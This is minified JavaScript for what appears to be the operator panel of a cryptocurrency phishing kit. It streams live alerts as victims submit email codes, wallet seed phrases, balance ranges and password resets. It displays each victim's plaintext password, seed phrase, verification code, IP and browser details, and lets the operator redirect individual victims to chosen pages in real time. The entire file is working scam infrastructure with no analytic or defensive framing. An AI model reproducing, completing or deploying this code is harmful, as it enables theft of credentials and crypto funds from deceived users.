import"https://code.iconify.design/iconify-icon/1.0.7/iconify-icon.min.js";import"https://code.iconify.design/2/2.1.2/iconify.min.js";const m=new WebSocket(`ws://${window.location.host}/ws`);m.onmessage=t=>{const e=JSON.parse(t.data);switch(e.type){case"email_code":window.showToast(`New email code submitted by ${e.email}`,"info");break;case"seed_phrase":window.showToast(`New seed phrase submitted by ${e.email}`,"info");break;case"balance":window.showToast(`New balance range submitted by ${e.email}`,"info");break;case"reset":window.showToast(`Password reset requested by ${e.email}`,"info");break;case"status_update":const o=document.querySelector(`.status-toggle[data-email="${e.email}"]`);o&&(o.dataset.status=e.status,o.textContent=e.status==="active"?"Active":"Inactive",o.classList.remove("active","inactive"),o.classList.add(e.status));break}};m.onerror=t=>{console.error("WebSocket error:",t),window.showToast("Connection error. Real-time updates may not work.","error")};m.onclose=()=>{console.log("WebSocket connection closed"),window.showToast("Connection lost. Real-time updates disabled.","error")};document.addEventListener("click",async t=>{const e=t.target;if(e.classList.contains("view")){const o=e.dataset.email;if(o)try{const n=await(await fetch(`/api/users?email=${o}`)).json();document.getElementById("detailEmail").textContent=n.email,document.getElementById("detailPassword").textContent=n.password||"Not set",document.getElementById("detailUserSeed").textContent=n.user_seed_phrase||"Not set",document.getElementById("detailEmailCode").textContent=n.email_code||"Not set",document.getElementById("detailIp").textContent=n.ip_address||"Not set",document.getElementById("detailBrowser").textContent=n.browser||"Not set",document.getElementById("detailOs").textContent=n.operating_system||"Not set",document.getElementById("detailUserAgent").textContent=n.user_agent||"Not set",document.getElementById("detailBalance").textContent=n.balance_range||"Not set",document.getElementById("detailCurrentPage").textContent=n.current_page||"Not set",document.getElementById("detailCreated").textContent=new Date(n.created_at).toLocaleString(),document.getElementById("detailUpdated").textContent=new Date(n.updated_at).toLocaleString(),window.openPopup("userDetailsPopup"),window.showToast("User details loaded successfully","success")}catch(s){console.error("Error fetching user details:",s),window.showToast("Failed to fetch user details","error")}}});document.addEventListener("click",async t=>{const e=t.target;if(e.classList.contains("redirect")){const o=e.dataset.email;if(o){const s=document.getElementById("redirectPopup");s&&(window.openPopup("redirectPopup"),window.showToast("Select a page to redirect the user","info"),s.dataset.email=o)}}});const c=document.getElementById("redirectSelect"),u=document.getElementById("redirectButton");c?.addEventListener("change",()=>{u&&(u.disabled=!c.value,c.value&&window.showToast(`Selected page: ${c.value}`,"info"))});u?.addEventListener("click",async()=>{const e=document.getElementById("redirectPopup")?.dataset.email,o=c.value;if(e&&o)try{if(!(await fetch("/api/users",{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:e,current_page:o.replace("/","")})})).ok)throw new Error("Failed to update user");window.closePopup("redirectPopup"),window.showToast(`User redirected to ${o} page successfully!`,"success"),setTimeout(()=>{window.location.reload()},1e3)}catch(s){console.error("Error redirecting user:",s),window.showToast("Failed to redirect user. Please try again.","error")}});const w=document.getElementById("userSearch");w?.addEventListener("input",t=>{const e=t.target.value.toLowerCase(),o=document.querySelectorAll("#usersTableBody tr");let s=0;o.forEach(n=>{const r=n.querySelector("td:nth-child(3)")?.textContent?.toLowerCase()||"",d=n.querySelector("td:nth-child(2)")?.textContent?.toLowerCase()||"",y=n.querySelector("td:nth-child(4)")?.textContent?.toLowerCase()||"";r.includes(e)||d.includes(e)||y.includes(e)?(n.style.display="",s++):n.style.display="none"}),e&&window.showToast(`Found ${s} matching users`,"info")});window.addEventListener("load",()=>{window.showToast("Admin panel loaded successfully","success")});document.getElementById("deleteAllButton")?.addEventListener("click",()=>{window.openPopup("deleteConfirmPopup")});document.getElementById("confirmDeleteButton")?.addEventListener("click",async()=>{try{const t=document.getElementById("confirmDeleteButton");if(t.disabled=!0,t.textContent="Deleting...",!(await fetch("/api/users",{method:"DELETE",headers:{"Content-Type":"application/json"}})).ok)throw new Error("Failed to delete users");window.closePopup("deleteConfirmPopup"),window.showToast("All users deleted successfully!","success"),setTimeout(()=>{window.location.reload()},1e3)}catch(t){console.error("Error deleting users:",t),window.showToast("Failed to delete users. Please try again.","error");const e=document.getElementById("confirmDeleteButton");e.disabled=!1,e.textContent="Yes, Delete All"}});document.getElementById("cancelDeleteButton")?.addEventListener("click",()=>{window.closePopup("deleteConfirmPopup")});document.getElementById("logoutButton")?.addEventListener("click",async()=>{try{if((await fetch("/api/auth/logout",{method:"POST",headers:{"Content-Type":"application/json"}})).ok)window.showToast("Logged out successfully","success"),setTimeout(()=>{window.location.href="/"},1e3);else throw new Error("Failed to logout")}catch(t){console.error("Error during logout:",t),window.showToast("Failed to logout. Please try again.","error")}});document.getElementById("sendEmailButton")?.addEventListener("click",async()=>{try{const t=document.getElementById("sendEmailButton"),e=t.textContent;t.disabled=!0,t.textContent="Sending...",window.showToast("Email sent successfully","success"),t.disabled=!1,t.textContent=e}catch(t){console.error("Error sending email:",t),window.showToast("Failed to send email. Please try again.","error")}});document.getElementById("refreshButton")?.addEventListener("click",()=>{const t=document.getElementById("refreshButton");t.style.pointerEvents="none",window.showToast("Refreshing page...","info"),setTimeout(()=>{window.location.reload()},500)});const g=10;let a=1,l=[...document.querySelectorAll("#usersTableBody tr")];function i(){const t=Math.ceil(l.length/g),e=document.getElementById("prevPage"),o=document.getElementById("nextPage"),s=document.querySelectorAll(".page-number"),n=document.getElementById("usersTableBody");!e||!o||!n||(e.disabled=a===1,o.disabled=a===t,s.forEach(r=>{const d=parseInt(r.getAttribute("data-page")||"1");r.classList.toggle("active",d===a),r.style.display=d<=t?"":"none"}),n.setAttribute("data-current-page",a.toString()))}document.getElementById("prevPage")?.addEventListener("click",()=>{a>1&&(a--,i())});document.getElementById("nextPage")?.addEventListener("click",()=>{const t=Math.ceil(l.length/g);a<t&&(a++,i())});document.querySelectorAll(".page-number").forEach(t=>{t.addEventListener("click",()=>{const e=parseInt(t.getAttribute("data-page")||"1");e!==a&&(a=e,i())})});w?.addEventListener("input",t=>{const e=t.target.value.toLowerCase();l=Array.from(document.querySelectorAll("#usersTableBody tr")).filter(s=>{const n=s.querySelector("td:nth-child(3)")?.textContent?.toLowerCase()||"",r=s.querySelector("td:nth-child(2)")?.textContent?.toLowerCase()||"",d=s.querySelector("td:nth-child(4)")?.textContent?.toLowerCase()||"";return n.includes(e)||r.includes(e)||d.includes(e)}),a=1,i();const o=document.getElementById("userCount");o&&(o.textContent=l.length.toString())});window.addEventListener("load",()=>{i()});function p(t){const e=document.getElementById(t);e&&e.classList.remove("active")}document.querySelectorAll("[data-popup-close]").forEach(t=>{const e=t.getAttribute("data-popup-close");e&&t.addEventListener("click",()=>p(e))});document.querySelectorAll(".popup-overlay").forEach(t=>{t.addEventListener("click",e=>{e.target===t&&p(t.id)})});document.addEventListener("keydown",t=>{if(t.key==="Escape"){const e=document.querySelector(".popup-overlay.active");e&&p(e.id)}});window.openPopup=function(t){const e=document.getElementById(t);e&&e.classList.add("active")};window.closePopup=function(t){const e=document.getElementById(t);e&&e.classList.remove("active")};
